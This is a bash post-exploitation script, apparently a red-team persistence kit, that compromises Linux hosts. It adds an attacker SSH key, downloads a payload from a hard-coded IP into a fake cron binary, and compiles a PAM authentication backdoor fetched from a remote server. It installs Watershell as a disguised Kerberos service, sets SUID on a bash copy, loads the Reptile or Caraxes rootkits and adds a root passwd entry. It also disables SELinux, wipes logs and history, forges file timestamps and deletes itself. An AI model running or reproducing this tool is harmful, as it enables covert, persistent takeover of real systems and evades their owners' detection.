#!/bin/bash

set +e
set +o history
unset HISTFILE

CWD=$(pwd)

# Validate input
if [ $# -ne 1 ]; then
    echo "Usage: $0 <server_ip:port>"
    exit 1
fi
SERV_IP_PORT="$1"

# Check for wget or curl
FETCH_CMD="wget"
if ! command -v wget &>/dev/null; then
    FETCH_CMD="curl -O"
fi

SYSTEM=""

# Setup SSH backdoor and cron persistence
if ! grep -Fq "AuthorizedKeysFile .ssh\/authorized_keys /etc/ssh/.ssh/authorized_keys" /etc/ssh/sshd_config; then
  sed -i 's/^.*AuthorizedKeysFile.*$/AuthorizedKeysFile .ssh\/authorized_keys \/etc\/ssh\/.ssh\/authorized_keys/g' /etc/ssh/sshd_config
  mkdir -p /etc/ssh/.ssh
  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAWDlKPWaryrDFdaO95fsZckeAle/JgxfI7QDwCxsMBF root@localhost" > /etc/ssh/.ssh/authorized_keys
  touch -a -m -t `find /etc/ssh/ssh_config -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/ssh/.ssh/authorized_keys
fi
if [ ! -f "/usr/bin/cron" ]; then
  curl -k -o /usr/bin/cron https://10.203.27.249/xxeqUJEf/pmox
  chmod 700 /usr/bin/cron
  touch -a -m -t `find /usr/bin/cat -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /usr/bin/cron
fi
touch -a -m -t `find /usr/bin/cat -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /usr/bin/cron
if ! grep -Fq "/usr/bin/cron" /etc/systemd/system/multi-user.target.wants/cron.service; then
  systemctl enable cron
  sed 's/^ExecStart=/ExecStartPre=\/bin\/sh -c "nohup \/usr\/bin\/cron --precheck > \/dev\/null 2>\&1 \&"\nExecStart"/g' /etc/systemd/system/multi-user.target.wants/cron.service
  touch -a -m -t `find /etc/hostname -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/systemd/system/multi-user.target.wants/cron.service
  systemctl stop cron
  systemctl start cron
fi

# Determine package manager
PKG_MANAGER=""
if command -v apt &>/dev/null; then
    PKG_MANAGER="apt install -y"
    SYSTEM="debian"
    apt update -y
    $PKG_MANAGER libpam0g-dev gcc make build-essential linux-headers-$(uname -r)
elif command -v dnf &>/dev/null; then
    PKG_MANAGER="dnf install -y"
    SYSTEM="rhel"
    # dnf update -y
    $PKG_MANAGER pam-devel gcc make kernel-devel-$(uname -r) elfutils-libelf-devel
elif command -v yum &>/dev/null; then
    PKG_MANAGER="yum install -y"
    SYSTEM="rhel"
    # yum update -y
    $PKG_MANAGER pam-devel gcc make kernel-devel-$(uname -r) elfutils-libelf-devel
else
    exit 1
fi

# Create directories
mkdir -p /var/opt/kerberos_auth /opt/kerberos_auth
cd /var/opt/kerberos_auth

# Backdoor PAM
$FETCH_CMD $SERV_IP_PORT/pam_backdoor.c

gcc -fPIC -shared -o pam_kerberos_auth.so pam_backdoor.c

# Modify PAM configuration
if [ "$SYSTEM" = "debian" ]; then
    PAM_SO_FILE=""
    PAM_VAR="pam_kerberos_auth.so"
    # Find module location
    if [ -d /lib/x86_64-linux-gnu/security ]; then
        PAM_SO_FILE="/lib/x86_64-linux-gnu/security/pam_kerberos_auth.so"
    elif [ -d /lib/security ]; then
        PAM_SO_FILE="/lib/security/pam_kerberos_auth.so"
    elif [ -d /lib/i386-linux-gnu/security ]; then
        PAM_SO_FILE="/lib/i386-linux-gnu/security/pam_kerberos_auth.so"
    elif [ -d /usr/lib64/security ]; then
        PAM_SO_FILE="/usr/lib64/security/pam_kerberos_auth.so"
    elif [ -d /usr/lib/security ]; then
        PAM_SO_FILE="/usr/lib/security/pam_kerberos_auth.so"
    else
        PAM_SO_FILE="/etc/pam.d/pam_kerberos_auth.so"
        PAM_VAR="/etc/pam.d/pam_kerberos_auth.so"
    fi
    mv pam_kerberos_auth.so "$PAM_SO_FILE"
    chmod -x "$PAM_SO_FILE"
    if ! grep -qF "pam_kerberos_auth.so" "/etc/pam.d/common-auth"; then
        awk -v newline="auth    sufficient                      $PAM_VAR" '
            NF > 0 && $1 !~ /^#/ && !done {
                print newline;
                $0 = $0 " use_first_pass";
                done = 1;
            }
            { print }
        ' "/etc/pam.d/common-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/common-auth"
    fi
    touch -d "Jun 26 2022" "/etc/pam.d/common-auth"
else
    PAM_SO_FILE=""
    PAM_VAR="pam_kerberos_auth.so"
    # Find module location
    if [ -d /lib64/security ]; then
        PAM_SO_FILE="/lib64/security/pam_kerberos_auth.so"
    elif [ -d /lib/security ]; then
        PAM_SO_FILE="/lib/security/pam_kerberos_auth.so"
    elif [ -d /usr/lib64/security ]; then
        PAM_SO_FILE="/usr/lib64/security/pam_kerberos_auth.so"
    elif [ -d /usr/lib/security ]; then
        PAM_SO_FILE="/usr/lib/security/pam_kerberos_auth.so"
    else
        PAM_SO_FILE="/etc/security/pam_kerberos_auth.so"
        PAM_VAR="/etc/pam.d/pam_kerberos_auth.so"
    fi
    mv pam_kerberos_auth.so "$PAM_SO_FILE"
    chmod -x "$PAM_SO_FILE"
    if ! grep -qF "pam_kerberos_auth.so" "/etc/pam.d/system-auth"; then
        awk -v newline="auth    sufficient                      $PAM_VAR" '
            NF > 0 && $1 !~ /^#/ && !done {
                print newline;
                $0 = $0 " use_first_pass";
                done = 1;
            }
            { print }
        ' "/etc/pam.d/system-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/system-auth"
    fi
    if ! grep -qF "pam_kerberos_auth.so" "/etc/pam.d/password-auth"; then
        awk -v newline="auth    sufficient                      $PAM_VAR" '
            NF > 0 && $1 !~ /^#/ && !done {
                print newline;
                $0 = $0 " use_first_pass";
                done = 1;
            }
            { print }
        ' "/etc/pam.d/password-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/password-auth"
    fi  
    touch -d "Jun 26 2022" "/etc/pam.d/system-auth"
    touch -d "Jun 26 2022" "/etc/pam.d/password-auth"
fi  


# Enable root login
if grep -q '^PermitRootLogin' /etc/ssh/sshd_config; then
    sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config
else
    echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
fi
systemctl restart sshd 2>/dev/null &
systemctl restart ssh 2>/dev/null &


# Install Watershell
$FETCH_CMD "$SERV_IP_PORT/watershell.tar.gz"
tar -xvf watershell.tar.gz
rm watershell.tar.gz
cd watershell
gcc -o kerberos_auth_sys watershell.c || mv kerberos_auth_sys /opt/kerberos_auth/
mv kerberos_auth_sys /opt/kerberos_auth/
/opt/kerberos_auth/kerberos_auth_sys &
cat > /etc/systemd/system/kerberos_auth_sys.service <<EOF
[Unit]
Description=Kerberos Authentication System Service
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/opt/kerberos_auth/kerberos_auth_sys &
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
cd /var/opt/kerberos_auth
systemctl enable kerberos_auth_sys.service

# Set SUID bits
chmod u+s $(which ip) $(which chroot)
if [ "$SYSTEM" = "rhel" ]; then
    mkdir -p /usr/lib/openssh
fi
cp $(which bash) /usr/lib/openssh/ssh-keygen
chmod u+s /usr/lib/openssh/ssh-keygen

# Install net-tools
$PKG_MANAGER net-tools

# Determine kernel version
KERNEL_MAJOR=$(uname -r | cut -d'.' -f1)

# Install rootkit
if [ "$KERNEL_MAJOR" -le 4 ]; then
    $FETCH_CMD $SERV_IP_PORT/reptile.tar.gz
    tar -xvf reptile.tar.gz
    rm reptile.tar.gz
    cd reptile
    make defconfig
    make
    make install
    rm -rf ../reptile
    cd /var/opt/kerberos_auth
    echo '#<reptile>' >> /etc/passwd
    echo 'tty0:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
    echo '#</reptile>' >> /etc/passwd
else
    sysctl kernel.ftrace_enabled=1
    $FETCH_CMD $SERV_IP_PORT/caraxes.tar.gz
    tar -xvf caraxes.tar.gz
    rm caraxes.tar.gz
    cd caraxes
    make
    insmod caraxes.ko
    mv caraxes.ko /opt/kerberos_auth/kerberos_auth.ko
    cat > /lib/udev/kerberos_auth <<EOF
#!/bin/bash
setenforce 0
insmod /opt/kerberos_auth/kerberos_auth.ko
nohup dmesg -C
rm -f nohup.out
grep -rlZ "kerberos_auth" /var/log | xargs -0 sed -i '/kerberos_auth/d'
EOF
    chmod +x /lib/udev/kerberos_auth
    rm -rf ../caraxes
    cd /var/opt/kerberos_auth
fi

# Create startup service for rootkit 
cat > /etc/systemd/system/kerberos_auth_stat.service <<EOF
[Unit]
Description=Kerberos Authentication Status Service
After=network.target

[Service]
Type=oneshot
ExecStart=/lib/udev/kerberos_auth
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
systemctl enable kerberos_auth_stat.service


# clear da logs
dmesg -C

# Change file dates
touch -d "Aug 2 2018" "/etc/passwd"
touch -d "May 10 2019" "/etc/ssh/sshd_config"
touch -d "Jun 14 2018" "/etc/pam.d"
touch -d "Aug 2 2018" "/opt"
touch -d "Aug 2 2018" "/var/opt"
touch -d "Dec 11 2019" "/usr/lib/openssh/ssh-keygen"
touch -d "Dec 21 2019" "$(which ip)"
touch -d "Dec 29 2019" "$(which chroot)"

# Clear history
history -c
rm -f $HISTFILE
grep -rlZ "kerberos_auth" /var/log | xargs -0 sed -i '/kerberos_auth/d'

# Delete script
cd "$CWD"
rm -f "$0"